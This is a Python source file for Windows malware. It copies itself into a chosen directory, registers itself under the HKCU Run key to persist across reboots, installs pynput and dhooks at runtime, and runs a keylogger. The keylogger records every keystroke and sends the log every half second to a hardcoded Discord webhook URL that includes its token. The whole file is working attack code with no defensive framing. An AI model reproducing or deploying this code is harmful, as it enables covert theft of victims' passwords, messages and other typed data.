import os
import shutil
import sys
import winreg as reg

def move_script(target_dir):
    try:
        # Get the path of the current script
        current_script = os.path.abspath(sys.argv[0])

        # Create target directory if it doesn't exist
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)

        # Move the script to the target directory
        target_path = os.path.join(target_dir, os.path.basename(current_script))
        shutil.move(current_script, target_path)
        print(f"Script moved to {target_path}")

        return target_path
    except Exception as e:
        print(f"Error: {e}")
        return None

def add_to_startup(target_path):
    try:
        # Define the registry key
        key = r'Software\Microsoft\Windows\CurrentVersion\Run'
        value_name = 'MyPythonScript'

        # Open the registry key and set the value
        with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
            reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, target_path)
        print(f"Added to startup via registry: {target_path}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    target_directory = "C:\\path\\to\\target\\directory"  # Replace with your target directory
    moved_script_path = move_script(target_directory)
    if moved_script_path:
        add_to_startup(moved_script_path)

import subprocess

# Define the packages to install as a list
packages = ['dhooks', 'pynput']  # Replace with the packages you want to install

# Install each package
for name in packages:
    subprocess.call([sys.executable, '-m', 'pip', 'install', name])


from dhooks import Webhook
from threading import Timer
from pynput.keyboard import Listener


WEBHOOK_URL = 'https://discord.com/api/webhooks/1262772776792490004/Rcav39-u2VM1L-o4MVn9EYUjQcUhEEMs9ocvvs1lTYQdE4peF4Fkye5RWTvDK_sPrmRx'
TIME_INTERVAL = 0.5  # Amount of time between each report, expressed in seconds.


class Keylogger:
    def __init__(self, webhook_url, interval):
        self.interval = interval
        self.webhook = Webhook(webhook_url)
        self.log = ""

    def _report(self):
        if self.log != '':
            self.webhook.send(self.log)
            self.log = ''
        Timer(self.interval, self._report).start()

    def _on_key_press(self, key):
        self.log += str(key)

    def run(self):
        self._report()
        with Listener(self._on_key_press) as t:
            t.join()


if __name__ == '__main__':
    Keylogger(WEBHOOK_URL, TIME_INTERVAL).run()

